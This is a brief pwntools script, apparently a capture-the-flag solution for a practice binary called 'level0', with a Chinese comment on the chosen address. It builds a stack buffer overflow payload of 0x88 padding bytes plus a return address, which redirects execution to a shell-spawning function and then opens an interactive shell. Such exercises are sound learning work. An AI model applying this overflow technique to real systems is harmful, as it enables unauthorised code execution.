from pwn import *

elf = ELF("./level0")

binsh_addr = elf.symbols["callsystem"]

print(binsh_addr)

io = process("./level0")

#这里不能用上面的binsh_addr，原因在于查看IDA会发现0x400596位置的开头并不是callsystem函数的首地址，所以用后面的地址（0x400597,0x400598均可！！！）
payload = cyclic(0x80 + 8) + p64(0x0400597)

io.recvline()

#print(io.recvline())

io.send(payload)

io.interactive()
